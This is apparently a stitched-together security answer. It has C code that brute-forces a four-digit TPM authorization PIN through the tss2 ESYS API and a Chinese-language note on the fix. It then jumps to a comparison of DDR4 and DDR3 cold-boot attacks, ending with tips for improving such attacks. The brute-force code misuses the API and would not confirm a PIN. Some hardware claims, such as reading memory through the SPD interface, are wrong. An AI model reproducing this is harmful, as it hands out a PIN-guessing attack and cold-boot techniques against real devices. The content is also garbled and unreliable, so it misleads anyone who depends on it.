c
#include <tss2/tss2_esys.h>
#include <stdio.h>
#include <string.h>

int main() {
    ESYS_CONTEXT *ctx;
    TSS2_RC rc;
    ESYS_TR session;
    TPM2B_AUTH auth = { .size = 4, .buffer = {0} };

    Esys_Initialize(&ctx, NULL, NULL);

    for (int pin = 0; pin < 10000; pin++) {
        sprintf((char*)auth.buffer, "%04d", pin);
        rc = Esys_StartAuthSession(ctx, ESYS_TR_NONE, ESYS_TR_NONE, ESYS_TR_NONE, NULL, NULL, TPM2_SE_POLICY, &session);
        if (rc != TSS2_RC_SUCCESS) continue;

        rc = Esys_PolicyAuthValue(ctx, session, ESYS_TR_NONE, ESYS_TR_NONE, ESYS_TR_NONE, &auth);
        if (rc == TSS2_RC_SUCCESS) {
            printf("Found PIN: %04d\n", pin);
            break;
        }
        Esys_FlushContext(ctx, session);
    }

    Esys_Finalize(&ctx);
    return 0;
}


修复：TPM固件应实现速率限制（如每次失败后增加延迟）或锁定机制（如连续失败N次后锁定）。厂商已发布固件更新（如Infineon TPM 1.2/2.0固件4.3.1.0）。用户应更新TPM固件并设置强授权值。

DDR4相比DDR3在冷启动攻击方面有显著差异，主要源于其物理设计和刷新机制。

1. 数据残留时间：DDR4使用更小的制程（如20nm vs 30nm），电容更小，电荷泄漏更快。室温下DDR3可保持数据数秒，DDR4仅数百毫秒。但低温下（-50°C）两者都能保持数分钟。
2. 刷新机制：DDR4支持伪随机行刷新（PRR）和温度补偿刷新（TCR），但断电后刷新停止。攻击者需在断电后极短时间内读取。
3. 内存控制器：DDR4集成在CPU内，冷启动时需初始化内存控制器，可能导致数据损坏。
4. 错误校正：DDR4支持ECC，但冷启动攻击仍可读取原始数据（ECC校验位可能被忽略）。

攻击改进：
- 使用FPGA直接读取内存条（绕过CPU），如通过SPD接口或DIMM插槽。
- 使用液氮快速冷却，延长数据保持时间。
- 使用自定义UEFI固件，在POST阶段直接转储内存。

